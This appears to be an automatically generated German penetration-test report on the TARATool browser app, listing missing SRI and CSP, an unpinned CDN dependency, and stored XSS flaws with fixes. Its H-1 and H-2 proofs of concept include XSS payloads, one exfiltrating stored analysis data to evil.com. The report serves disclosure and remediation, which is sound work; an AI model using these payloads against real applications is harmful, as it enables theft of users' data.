# TARATool ‚Äì Penetration Test Report

| Feld | Wert |
|------|------|
| **Datum** | 2026-02-23 |
| **Pr√ºfer** | Automated Security Audit (GitHub Copilot) |
| **Repository** | Bheowulf/TARATool + SCHUNK-SE-Co-KG/TARATool |
| **Branch** | Development |
| **Scope** | Vollst√§ndige Client-Side-Codebase (HTML, JS, CSS, CDN-Dependencies) |
| **Methode** | Static Application Security Testing (SAST), Dependency Audit, Manual Code Review |

---

## Executive Summary

Das TARATool ist eine clientseitige Single-Page-Application (SPA) f√ºr Bedrohungsanalysen (TARA nach ISO 21434). Die Anwendung l√§uft vollst√§ndig im Browser ohne Backend-Server.

Es wurden **3 kritische**, **4 hohe**, **6 mittlere**, **4 niedrige** und **6 informelle** Befunde identifiziert.

Die kritischsten Risiken betreffen fehlende **Subresource Integrity (SRI)** auf CDN-Ressourcen, eine fehlende **Content Security Policy (CSP)** sowie eine **ungepinnte CDN-Dependency**. Zusammen erm√∂glichen diese einen vollst√§ndigen Supply-Chain-Angriff.

| Severity | Anzahl | Handlungsbedarf |
|----------|--------|-----------------|
| üî¥ CRITICAL | 3 | Sofortige Behebung erforderlich |
| üü† HIGH | 4 | Behebung vor n√§chstem Release |
| üü° MEDIUM | 6 | Geplante Behebung empfohlen |
| üîµ LOW | 4 | Bei Gelegenheit beheben |
| ‚ö™ INFO | 6 | Keine Aktion erforderlich |

---

## üî¥ CRITICAL Findings

### C-1: Keine Subresource Integrity (SRI) auf CDN-Ressourcen

**CVSS 3.1:** 9.8 (Critical)  
**Datei:** `index.html` (Zeilen 16, 20, 448, 451)  
**CWE:** CWE-829 (Inclusion of Functionality from Untrusted Control Sphere)

**Beschreibung:**  
Alle vier CDN-geladenen Bibliotheken haben kein `integrity`-Attribut. Bei einem CDN-Compromise oder DNS-Poisoning kann ein Angreifer beliebigen Code einschleusen.

```html
<!-- Zeile 16 ‚Äì Kein integrity -->
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">

<!-- Zeile 20 ‚Äì Kein integrity, KEINE Version gepinnt -->
import { Graphviz } from "https://cdn.jsdelivr.net/npm/@hpcc-js/wasm/dist/index.js";

<!-- Zeile 448 ‚Äì Kein integrity -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>

<!-- Zeile 451 ‚Äì Kein integrity -->
<script src="https://cdn.jsdelivr.net/npm/jspdf@4.2.0/dist/jspdf.umd.min.js"></script>
```

**Angriffsszenario:**  
Angreifer kompromittiert CDN ‚Üí liefert modifizierten JS-Code ‚Üí exfiltriert alle TARA-Analysedaten, manipuliert Risikobewertungen, installiert persistente XSS.

**Empfehlung:**  
```html
<script src="https://cdn.jsdelivr.net/npm/jspdf@4.2.0/dist/jspdf.umd.min.js"
        integrity="sha384-<HASH>"
        crossorigin="anonymous"></script>
```
SRI-Hashes f√ºr alle CDN-Tags generieren (`sha384`). Tool: `openssl dgst -sha384 -binary <file> | openssl base64 -A`

---

### C-2: Keine Content Security Policy (CSP)

**CVSS 3.1:** 8.8 (High)  
**Datei:** `index.html` (gesamte Datei ‚Äì kein CSP meta-Tag)  
**CWE:** CWE-1021 (Improper Restriction of Rendered UI Layers)

**Beschreibung:**  
Es existiert weder ein `<meta http-equiv="Content-Security-Policy">`-Tag noch ein serverseitiger CSP-Header. Jede erfolgreiche XSS-Injection wird nicht durch CSP abgemildert.

**Inline Event Handler (erfordern `unsafe-inline`):**
- `index.html:39` ‚Äì `onclick="openAboutModal()"`
- `index.html:305` ‚Äì `onclick="renderCurrentTreePreview()"`
- `index.html:341` ‚Äì `onclick="executeImport()"`
- `index.html:378` ‚Äì `onclick="openVersionCommentModal()"`
- `index.html:406` ‚Äì `onclick="closeAboutModal()"`

**Empfehlung:**  
1. Alle inline `onclick`-Handler zu `addEventListener()`-Aufrufen refactoren
2. CSP-Meta-Tag hinzuf√ºgen:
```html
<meta http-equiv="Content-Security-Policy"
      content="default-src 'self';
               script-src 'self' https://cdn.jsdelivr.net https://cdnjs.cloudflare.com 'nonce-{RANDOM}';
               style-src 'self' https://cdnjs.cloudflare.com 'unsafe-inline';
               font-src https://cdnjs.cloudflare.com;
               connect-src 'self' https://kroki.io https://quickchart.io;
               img-src 'self' data: blob:;">
```

---

### C-3: Ungepinnte CDN-Dependency (@hpcc-js/wasm)

**CVSS 3.1:** 9.1 (Critical)  
**Datei:** `index.html:20`  
**CWE:** CWE-1104 (Use of Unmaintained Third-Party Components)

**Beschreibung:**  
```javascript
import { Graphviz } from "https://cdn.jsdelivr.net/npm/@hpcc-js/wasm/dist/index.js";
```
Die `@hpcc-js/wasm`-Bibliothek wird ohne Versionsangabe geladen (`latest`). Ein Supply-Chain-Angriff auf das npm-Paket w√ºrde automatisch alle Benutzer betreffen.

**Empfehlung:**  
Version pinnen: `@hpcc-js/wasm@2.16.1/dist/index.js` + SRI-Hash hinzuf√ºgen.

---

## üü† HIGH Findings

### H-1: XSS via Unescaped `analysis.metadata.author` in innerHTML

**CVSS 3.1:** 7.1 (High)  
**Datei:** `js/core/analysis_core.js:85-89`  
**CWE:** CWE-79 (Cross-Site Scripting ‚Äì Stored)

**Beschreibung:**  
```javascript
elMetadata.innerHTML = `
    <span>Version: ${analysis.metadata.version}</span> | 
    <span>Autor: ${analysis.metadata.author}</span> | 
    <span>Datum: ${analysis.metadata.date}</span>
`;
```
`analysis.metadata.author` ist Benutzereingabe und wird direkt in `innerHTML` injiziert, ohne `escapeHtml()` aufzurufen.

**Proof of Concept:**  
Autor-Feld eingeben: `<img src=x onerror=alert(document.cookie)>` ‚Üí Script wird bei jedem Laden der Analyse ausgef√ºhrt.

**Empfehlung:**  
```javascript
elMetadata.innerHTML = `
    <span>Version: ${escapeHtml(analysis.metadata.version)}</span> | 
    <span>Autor: ${escapeHtml(analysis.metadata.author)}</span> | 
    <span>Datum: ${escapeHtml(analysis.metadata.date)}</span>
`;
```

---

### H-2: XSS via Unescaped `analysis.name` in L√∂sch-Dialog

**CVSS 3.1:** 7.1 (High)  
**Datei:** `js/core/analysis_core.js:460`  
**CWE:** CWE-79 (Cross-Site Scripting ‚Äì Stored)

**Beschreibung:**  
```javascript
if (msg) msg.innerHTML = `Sind Sie sicher, dass Sie die Analyse <strong>${analysis.name}</strong> unwiderruflich l√∂schen m√∂chten?...`;
```
`analysis.name` wird ohne Escaping in innerHTML eingef√ºgt.

**Proof of Concept:**  
Importierte JSON-Datei mit: `"name": "<img src=x onerror=\"fetch('https://evil.com/'+btoa(localStorage.getItem('taraAnalyses')))\">"` ‚Üí beim Klick auf "Analyse l√∂schen" werden alle gespeicherten Analyse-Daten exfiltriert.

**Empfehlung:**  
```javascript
if (msg) msg.innerHTML = `Sind Sie sicher, dass Sie die Analyse <strong>${escapeHtml(analysis.name)}</strong> unwiderruflich l√∂schen m√∂chten?...`;
```

---

### H-3: Unzureichende Validierung importierter JSON-Dateien

**CVSS 3.1:** 7.5 (High)  
**Datei:** `js/core/analysis_core.js:218-229`  
**CWE:** CWE-20 (Improper Input Validation)

**Beschreibung:**  
```javascript
const json = JSON.parse(ev.target.result);
if (json.id && json.metadata) {
    analysisData.push(json);
    migrateAnalysis(json);
    saveAnalyses();
    activateAnalysis(json.id);
```
Der Import pr√ºft nur auf `json.id` und `json.metadata`. Es gibt keine Schema-Validierung, Typ-Pr√ºfung oder Sanitierung der Feldwerte.

**Angriffsszenario:**  
Ein pr√§parierter JSON-Export mit XSS-Payloads in `name`, `metadata.author`, `description`, Asset-Namen, Schadensszenarien etc. wird importiert ‚Üí Persistente XSS √ºber die unescaped innerHTML-Sinks (H-1, H-2).

**Empfehlung:**  
1. JSON-Schema-Validierung implementieren (Typ-Checks, max. Feldl√§nge)
2. Rekursive Sanitierung aller String-Werte im importierten Objekt
3. Ablehnung von HTML-Tags in Textfeldern

---

### H-4: Vertrauliche Analysedaten an Drittanbieter-Services √ºbermittelt

**CVSS 3.1:** 7.4 (High)  
**Datei:** `js/report/report_pdf_helpers.js:18-33`  
**CWE:** CWE-200 (Exposure of Sensitive Information)

**Beschreibung:**  
```javascript
const GRAPHVIZ_RENDERERS = [
    { name: 'Kroki', url: 'https://kroki.io/graphviz/svg', body: (dot) => dot },
    { name: 'QuickChart', url: 'https://quickchart.io/graphviz', body: (dot) => JSON.stringify({ graph: dot }) }
];
```
Vollst√§ndige Attack-Tree-Daten (Schwachstellennamen, Risiko-Scores, Angriffspfade, Security-Bewertungen) werden per POST an √∂ffentliche Services gesendet.

**Empfehlung:**  
Lokales WASM-basiertes Graphviz-Rendering verwenden (`@hpcc-js/wasm` ist bereits geladen). Externes Rendering nur als Opt-in mit deutlicher Warnung anbieten.

---

## üü° MEDIUM Findings

### M-1: Analysedaten unverschl√ºsselt in localStorage

**Datei:** `js/core/utils.js:58-65`  
**CWE:** CWE-312 (Cleartext Storage of Sensitive Information)

```javascript
localStorage.setItem('taraAnalyses', JSON.stringify(analysisData));
```

Alle TARA-Analysedaten (Assets, Threat Models, Risikobewertungen, Angriffsb√§ume) liegen als Klartext-JSON in `localStorage`. Jedes Script auf derselben Origin sowie Browser-Extensions mit Content-Script-Zugriff k√∂nnen die Daten lesen.

**Empfehlung:** Web Crypto API f√ºr Verschl√ºsselung und HMAC-basierte Integrit√§tspr√ºfung einsetzen.

---

### M-2: `showConfirmation()` akzeptiert Raw-HTML

**Datei:** `js/core/utils.js:248` (`messageHtml` Parameter)  
**CWE:** CWE-79 (XSS ‚Äì Design Weakness)

Die Utility-Funktion setzt `innerHTML` aus `messageHtml`. W√§hrend die meisten Aufrufer `escapeHtml()` verwenden, fehlt es bei `analysis_core.js:460` (siehe H-2).

**Empfehlung:** Default auf Text-Modus mit explizitem Opt-in f√ºr HTML.

---

### M-3: Synchrones XMLHttpRequest blockiert Main Thread

**Datei:** `js/core/config_loader.js:36-39`  
**CWE:** CWE-400 (Uncontrolled Resource Consumption)

```javascript
xhr.open('GET', configPath, false); // synchronous ‚Äì deprecated
```

**Empfehlung:** Auf `async/await` mit `fetch()` umstellen.

---

### M-4: Inline `onclick`-Handler mit interpolierten IDs

**Dateien:** `assets.js:54-55`, `damage_scenarios.js:73-74`, `risk_analysis.js:74-78`, `security_goals.js:166-167`, `versioning.js:48-51`  
**CWE:** CWE-79 (XSS ‚Äì Design Pattern)

```javascript
html += `<button onclick="editAsset('${eId}')" ...>`;
```

Zwar wird `eId` escaped, jedoch:
1. Blockiert CSP-Adoption (`unsafe-inline` erforderlich)
2. Sekund√§re Injection-Fl√§che falls `escapeHtml()` jemals buggy

**Empfehlung:** Event-Delegation mit `addEventListener()` + `data-*` Attributen.

---

### M-5: Keine Input-L√§ngenbegrenzung

**Dateien:** Alle Modul-Dateien  
**CWE:** CWE-400 (Uncontrolled Resource Consumption)

Die meisten Textfelder haben kein `maxlength`-Attribut. localStorage-Quota-Ersch√∂pfung m√∂glich.

**Empfehlung:** `maxlength`-Attribute auf allen Input-Feldern + Validierung importierter Daten.

---

### M-6: `version` und `date` Metadata nicht escaped

**Datei:** `js/core/analysis_core.js:85-89`  
**CWE:** CWE-79 (XSS)

Gleiche Stelle wie H-1: `analysis.metadata.version` und `analysis.metadata.date` werden ebenfalls ohne Escaping in `innerHTML` eingef√ºgt. K√∂nnen via JSON-Import manipuliert werden.

---

## üîµ LOW Findings

### L-1: Kein `crossorigin="anonymous"` auf CDN-Tags

**Datei:** `index.html:16`  
Ohne `crossorigin` k√∂nnen SRI-Hashes in einigen Browsern nicht verifiziert werden.

### L-2: SBOM-Felder in `about.js` nicht escaped

**Datei:** `js/core/about.js:155-160`  
`c.description` und `c.name` kommen aus hardcoded SBOM-Daten, werden aber ohne `escapeHtml()` in `<a>` Tag injiziert.

### L-3: Native `confirm()` im Attack Tree Editor

**Datei:** `js/attack_tree/attack_tree_structure.js:621, 643`  
Nativ `confirm()` kann durch Prototype-Pollution von `window.confirm` unterdr√ºckt werden.

### L-4: Error-Details in Browser-Console

**Dateien:** Mehrere Dateien verwenden `console.error()` mit vollst√§ndigen Error-Objekten.  
Kann Angreifern interne Application-Logik offenlegen.

---

## ‚ö™ INFO Findings

### I-1: Third-Party Library Inventory

| Bibliothek | Version | CDN | SRI | Status |
|-----------|---------|-----|-----|--------|
| Font Awesome | 6.5.1 | cdnjs | ‚ùå | Keine kritischen CVEs |
| @hpcc-js/wasm | **latest** (ungepinnt!) | jsdelivr | ‚ùå | ‚ö†Ô∏è Supply-Chain-Risiko |
| jsPDF | 4.2.0 | jsdelivr | ‚ùå | Keine kritischen CVEs |
| JSZip | 3.10.1 | cdnjs | ‚ùå | Keine kritischen CVEs |

### I-2: Kein HTTPS-Enforcement
Statische SPA ohne Mechanismus zur HTTPS-Durchsetzung.

### I-3: `escapeHtml()` korrekt implementiert ‚úÖ
Die Escape-Funktion in `utils.js:215-223` behandelt alle 5 kritischen Zeichen korrekt. Problem: nicht konsistente Nutzung.

### I-4: PDF-Generierung sicher ‚úÖ
`jsPDF.text()` behandelt Input als Plaintext. `sanitizePdfText()` entfernt Non-Latin1 Zeichen. Kein PDF-Injection-Vektor identifiziert.

### I-5: Kein DOM Clobbering ‚úÖ
Konsequente Nutzung von `document.getElementById()` statt impliziter Window-ID-Properties.

### I-6: Kein Prototype Pollution ‚úÖ
Deep Cloning via `JSON.parse(JSON.stringify(...))`. `Object.freeze()` auf Config-Konstanten.

---

## Remediation Priority Matrix

| Priorit√§t | Finding | Aufwand | Impact |
|-----------|---------|---------|--------|
| üî¥ **P1** | C-1: SRI-Hashes hinzuf√ºgen | 1h | Blockiert Supply-Chain-Angriffe |
| üî¥ **P1** | C-3: @hpcc-js/wasm Version pinnen | 15min | Blockiert Auto-Update-Angriff |
| üî¥ **P2** | H-1+H-2: escapeHtml() in analysis_core.js | 30min | Behebt Stored XSS |
| üî¥ **P2** | H-3: JSON-Import-Validierung | 2-4h | Blockiert XSS via Import |
| üü† **P3** | C-2: CSP implementieren | 4-8h | Defense-in-Depth gegen XSS |
| üü† **P3** | H-4: Lokales Graphviz-Rendering | 2-4h | Verhindert Datenabfluss |
| üü° **P4** | M-1 bis M-6 | 4-8h | Verbesserung der Gesamtsicherheit |
| üîµ **P5** | L-1 bis L-4 | 2h | H√§rtung |

---

## Gesamtbewertung

**Risikostufe: HOCH**

Die Anwendung hat wirksame Schutzma√ünahmen in den Modulen (konsistente `escapeHtml()`-Nutzung in Assets, Damage Scenarios, Risk Analysis, Security Goals). Jedoch bestehen kritische L√ºcken in der Infrastruktur-Ebene (keine SRI, keine CSP, ungepinnte Dependencies) und zwei konkrete XSS-Schwachstellen in `analysis_core.js`.

Die dringendsten Behebungen (P1: SRI + Version-Pinning, P2: escapeHtml-Fixes) sind mit minimalem Aufwand (< 2h) umsetzbar und sollten sofort durchgef√ºhrt werden.

---

*Report generiert am 2026-02-23 | TARATool Pentest v1.0*
